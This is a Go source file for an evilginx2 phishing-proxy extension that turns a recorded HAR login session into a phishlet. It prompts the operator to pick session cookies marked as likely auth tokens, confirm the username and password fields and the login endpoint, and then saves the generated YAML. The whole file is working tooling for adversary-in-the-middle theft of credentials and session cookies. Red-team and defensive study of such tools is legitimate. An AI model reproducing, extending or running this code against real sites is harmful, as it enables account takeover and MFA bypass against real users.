package core

import (
	"fmt"
	"os"
	"path/filepath"
	"sort"
	"strconv"
	"strings"

	"github.com/chzyer/readline"
	"github.com/fatih/color"
	"github.com/kgretzky/evilginx2/log"
)

// NetterGenerator handles phishlet generation from HAR files
type NetterGenerator struct {
	rl  *readline.Instance
	cfg *Config
}

func NewNetterGenerator(rl *readline.Instance, cfg *Config) *NetterGenerator {
	return &NetterGenerator{
		rl:  rl,
		cfg: cfg,
	}
}

// Generate runs the full generation workflow
func (ng *NetterGenerator) Generate(harPath string) error {
	// Expand ~ to home directory
	if strings.HasPrefix(harPath, "~") {
		home, err := os.UserHomeDir()
		if err != nil {
			return fmt.Errorf("failed to expand home directory: %v", err)
		}
		harPath = filepath.Join(home, harPath[1:])
	}

	// Parse HAR file
	log.Info("Parsing HAR file: %s", harPath)
	parser := NewHARParser()
	analysis, err := parser.ParseFile(harPath)
	if err != nil {
		return fmt.Errorf("failed to parse HAR: %v", err)
	}

	// Validate
	if err := analysis.Validate(); err != nil {
		return fmt.Errorf("HAR validation failed: %v", err)
	}

	log.Success("Found %d domains, %d cookies, %d POST requests",
		len(analysis.Domains), len(analysis.Cookies), len(analysis.PostRequests))

	// Interactive cookie selection
	selectedCookies, err := ng.promptCookieSelection(analysis)
	if err != nil {
		return err
	}

	// Interactive credentials confirmation
	credentials, err := ng.promptCredentialsConfirmation(analysis)
	if err != nil {
		return err
	}

	// Interactive login confirmation
	loginInfo, err := ng.promptLoginConfirmation(analysis)
	if err != nil {
		return err
	}

	// Generate phishlet
	log.Info("Generating phishlet...")
	builder := NewPhishletBuilder(analysis, selectedCookies, credentials, loginInfo)
	phishletYAML, err := builder.Build()
	if err != nil {
		return fmt.Errorf("failed to generate phishlet: %v", err)
	}

	// Display output
	ng.displayPhishlet(phishletYAML)

	// Prompt to save
	return ng.promptSavePhishlet(phishletYAML)
}

func (ng *NetterGenerator) promptCookieSelection(analysis *HARAnalysis) ([]*CookieInfo, error) {
	fmt.Fprintf(color.Output, "\n%s\n\n",
		color.HiWhiteString("Found %d cookies across %d domains:", len(analysis.Cookies), len(analysis.Domains)))

	// Group cookies by domain
	cookiesByDomain := make(map[string][]*CookieInfo)
	for _, cookie := range analysis.Cookies {
		cookiesByDomain[cookie.Domain] = append(cookiesByDomain[cookie.Domain], cookie)
	}

	// Sort domains
	var domains []string
	for domain := range cookiesByDomain {
		domains = append(domains, domain)
	}
	sort.Strings(domains)

	// Display cookies with indices
	idx := 1
	cookieMap := make(map[int]*CookieInfo)

	for _, domain := range domains {
		fmt.Fprintf(color.Output, "%s\n", color.CyanString("Domain: %s", domain))

		cookies := cookiesByDomain[domain]
		sort.Slice(cookies, func(i, j int) bool {
			return cookies[i].Name < cookies[j].Name
		})

		for _, cookie := range cookies {
			marker := ""
			if cookie.IsAuthCandidate {
				marker = color.YellowString(" *likely auth token*")
			}
			fmt.Fprintf(color.Output, "  [%d] %s (HttpOnly: %v, Secure: %v)%s\n",
				idx, cookie.Name, cookie.HttpOnly, cookie.Secure, marker)
			cookieMap[idx] = cookie
			idx++
		}
		fmt.Fprintf(color.Output, "\n")
	}

	// Read user input
	originalPrompt := ng.rl.Config.Prompt
	ng.rl.SetPrompt("Enter cookie numbers (comma-separated), 'all' for auth candidates, or '*' for all: ")
	input, err := ng.rl.Readline()
	if err != nil {
		ng.rl.SetPrompt(originalPrompt)
		return nil, err
	}
	ng.rl.SetPrompt(originalPrompt)

	input = strings.TrimSpace(input)

	// Parse selection
	var selected []*CookieInfo
	if input == "all" {
		for _, c := range analysis.Cookies {
			if c.IsAuthCandidate {
				selected = append(selected, c)
			}
		}
	} else if input == "*" {
		selected = analysis.Cookies
	} else {
		// Parse comma-separated numbers
		parts := strings.Split(input, ",")
		for _, p := range parts {
			num, err := strconv.Atoi(strings.TrimSpace(p))
			if err != nil || num < 1 || num >= idx {
				return nil, fmt.Errorf("invalid selection: %s", p)
			}
			selected = append(selected, cookieMap[num])
		}
	}

	if len(selected) == 0 {
		return nil, fmt.Errorf("at least one cookie must be selected")
	}

	log.Success("Selected %d cookies", len(selected))
	return selected, nil
}

func (ng *NetterGenerator) promptCredentialsConfirmation(analysis *HARAnalysis) (*PostRequestInfo, error) {
	if analysis.LoginCandidate == nil {
		return nil, fmt.Errorf("no login credentials detected")
	}

	cred := analysis.LoginCandidate

	fmt.Fprintf(color.Output, "\n%s\n\n",
		color.HiWhiteString("Detected login credentials in POST to: %s", cred.URL))

	fmt.Fprintf(color.Output, "%s\n", color.GreenString("Username field:"))
	fmt.Fprintf(color.Output, "  Key: %q\n", cred.UsernameKey)
	fmt.Fprintf(color.Output, "  Type: %s\n\n", cred.PostType)

	fmt.Fprintf(color.Output, "%s\n", color.GreenString("Password field:"))
	fmt.Fprintf(color.Output, "  Key: %q\n", cred.PasswordKey)
	fmt.Fprintf(color.Output, "  Type: %s\n\n", cred.PostType)

	originalPrompt := ng.rl.Config.Prompt
	ng.rl.SetPrompt("Accept these credentials? [Y/n]: ")
	input, err := ng.rl.Readline()
	if err != nil {
		ng.rl.SetPrompt(originalPrompt)
		return nil, err
	}
	ng.rl.SetPrompt(originalPrompt)

	input = strings.ToLower(strings.TrimSpace(input))
	if input == "" || input == "y" || input == "yes" {
		log.Success("Credentials confirmed")
		return cred, nil
	}

	// Manual selection
	return ng.promptManualCredentialSelection(analysis)
}

func (ng *NetterGenerator) promptManualCredentialSelection(analysis *HARAnalysis) (*PostRequestInfo, error) {
	if len(analysis.PostRequests) == 0 {
		return nil, fmt.Errorf("no POST requests available")
	}

	// Show all POST requests
	fmt.Fprintf(color.Output, "\n%s\n\n", color.HiWhiteString("Available POST requests:"))
	for i, post := range analysis.PostRequests {
		cookieInfo := ""
		if post.SetsAuthCookies {
			cookieInfo = color.GreenString(" (sets %d auth cookies)", post.AuthCookiesSet)
		}
		fmt.Fprintf(color.Output, "  [%d] %s%s\n", i+1, post.URL, cookieInfo)
	}

	originalPrompt := ng.rl.Config.Prompt
	ng.rl.SetPrompt("\nSelect POST request number: ")
	input, err := ng.rl.Readline()
	if err != nil {
		ng.rl.SetPrompt(originalPrompt)
		return nil, err
	}
	ng.rl.SetPrompt(originalPrompt)

	idx, err := strconv.Atoi(strings.TrimSpace(input))
	if err != nil || idx < 1 || idx > len(analysis.PostRequests) {
		return nil, fmt.Errorf("invalid selection")
	}

	selectedPost := analysis.PostRequests[idx-1]

	// Show fields in selected POST
	if len(selectedPost.Fields) == 0 {
		return nil, fmt.Errorf("selected POST has no fields")
	}

	fmt.Fprintf(color.Output, "\n%s\n\n", color.HiWhiteString("Available fields:"))
	var fieldNames []string
	for name := range selectedPost.Fields {
		fieldNames = append(fieldNames, name)
	}
	sort.Strings(fieldNames)

	for i, name := range fieldNames {
		fmt.Fprintf(color.Output, "  [%d] %s\n", i+1, name)
	}

	// Username field
	ng.rl.SetPrompt("\nSelect username field number: ")
	input, err = ng.rl.Readline()
	if err != nil {
		ng.rl.SetPrompt(originalPrompt)
		return nil, err
	}
	ng.rl.SetPrompt(originalPrompt)

	usernameIdx, err := strconv.Atoi(strings.TrimSpace(input))
	if err != nil || usernameIdx < 1 || usernameIdx > len(fieldNames) {
		return nil, fmt.Errorf("invalid username field selection")
	}

	// Password field
	ng.rl.SetPrompt("Select password field number: ")
	input, err = ng.rl.Readline()
	if err != nil {
		ng.rl.SetPrompt(originalPrompt)
		return nil, err
	}
	ng.rl.SetPrompt(originalPrompt)

	passwordIdx, err := strconv.Atoi(strings.TrimSpace(input))
	if err != nil || passwordIdx < 1 || passwordIdx > len(fieldNames) {
		return nil, fmt.Errorf("invalid password field selection")
	}

	selectedPost.UsernameKey = fieldNames[usernameIdx-1]
	selectedPost.PasswordKey = fieldNames[passwordIdx-1]

	log.Success("Manual credentials configured")
	return selectedPost, nil
}

func (ng *NetterGenerator) promptLoginConfirmation(analysis *HARAnalysis) (*PostRequestInfo, error) {
	if analysis.LoginCandidate == nil {
		return nil, fmt.Errorf("no login endpoint detected")
	}

	login := analysis.LoginCandidate

	fmt.Fprintf(color.Output, "\n%s\n", color.HiWhiteString("Detected login endpoint:"))
	fmt.Fprintf(color.Output, "  Domain: %s\n", color.CyanString(login.Domain))
	fmt.Fprintf(color.Output, "  Path: %s\n", color.CyanString(login.Path))
	fmt.Fprintf(color.Output, "\nThis request resulted in %s being set.\n\n",
		color.GreenString("%d auth cookies", login.AuthCookiesSet))

	originalPrompt := ng.rl.Config.Prompt
	ng.rl.SetPrompt("Accept this as login URL? [Y/n]: ")
	input, err := ng.rl.Readline()
	if err != nil {
		ng.rl.SetPrompt(originalPrompt)
		return nil, err
	}
	ng.rl.SetPrompt(originalPrompt)

	input = strings.ToLower(strings.TrimSpace(input))
	if input == "" || input == "y" || input == "yes" {
		log.Success("Login URL confirmed")
		return login, nil
	}

	// Manual selection
	return ng.promptManualLoginSelection(analysis)
}

func (ng *NetterGenerator) promptManualLoginSelection(analysis *HARAnalysis) (*PostRequestInfo, error) {
	if len(analysis.PostRequests) == 0 {
		return nil, fmt.Errorf("no POST requests available")
	}

	fmt.Fprintf(color.Output, "\n%s\n\n", color.HiWhiteString("Available POST endpoints:"))
	for i, post := range analysis.PostRequests {
		cookieInfo := color.RedString("(sets 0 cookies)")
		if post.SetsAuthCookies {
			cookieInfo = color.GreenString("(sets %d cookies)", post.AuthCookiesSet)
		}
		fmt.Fprintf(color.Output, "  [%d] %s %s %s\n", i+1, post.Domain, post.Path, cookieInfo)
	}

	originalPrompt := ng.rl.Config.Prompt
	ng.rl.SetPrompt("\nSelect login endpoint number: ")
	input, err := ng.rl.Readline()
	if err != nil {
		ng.rl.SetPrompt(originalPrompt)
		return nil, err
	}
	ng.rl.SetPrompt(originalPrompt)

	idx, err := strconv.Atoi(strings.TrimSpace(input))
	if err != nil || idx < 1 || idx > len(analysis.PostRequests) {
		return nil, fmt.Errorf("invalid selection")
	}

	log.Success("Login endpoint selected")
	return analysis.PostRequests[idx-1], nil
}

func (ng *NetterGenerator) displayPhishlet(yaml string) {
	separator := strings.Repeat("=", 70)
	fmt.Fprintf(color.Output, "\n%s\n", color.HiGreenString(separator))
	fmt.Fprintf(color.Output, "%s\n", color.HiGreenString("Generated Phishlet:"))
	fmt.Fprintf(color.Output, "%s\n", color.HiGreenString(separator))
	fmt.Fprintf(color.Output, "%s", yaml)
	fmt.Fprintf(color.Output, "%s\n\n", color.HiGreenString(separator))
}

func (ng *NetterGenerator) promptSavePhishlet(yaml string) error {
	originalPrompt := ng.rl.Config.Prompt
	ng.rl.SetPrompt("Save to phishlets directory? [y/N]: ")
	input, err := ng.rl.Readline()
	if err != nil {
		ng.rl.SetPrompt(originalPrompt)
		return err
	}
	ng.rl.SetPrompt(originalPrompt)

	input = strings.ToLower(strings.TrimSpace(input))
	if input != "y" && input != "yes" {
		log.Info("Phishlet not saved")
		return nil
	}

	// Prompt for name
	ng.rl.SetPrompt("Enter phishlet name (without .yaml): ")
	name, err := ng.rl.Readline()
	if err != nil {
		ng.rl.SetPrompt(originalPrompt)
		return err
	}
	ng.rl.SetPrompt(originalPrompt)

	name = strings.TrimSpace(name)
	if name == "" {
		return fmt.Errorf("phishlet name cannot be empty")
	}

	// Get phishlets directory from an existing phishlet
	phishletNames := ng.cfg.GetPhishletNames()
	if len(phishletNames) == 0 {
		return fmt.Errorf("no phishlets loaded - cannot determine phishlets directory")
	}

	phishlet, err := ng.cfg.GetPhishlet(phishletNames[0])
	if err != nil {
		return fmt.Errorf("failed to get phishlet path: %v", err)
	}

	phishletsDir := filepath.Dir(phishlet.Path)
	outputPath := filepath.Join(phishletsDir, name+".yaml")

	err = os.WriteFile(outputPath, []byte(yaml), 0644)
	if err != nil {
		return fmt.Errorf("failed to save phishlet: %v", err)
	}

	log.Success("Phishlet saved to: %s", outputPath)
	log.Info("Use 'phishlets hostname %s <domain>' to configure it", name)

	return nil
}
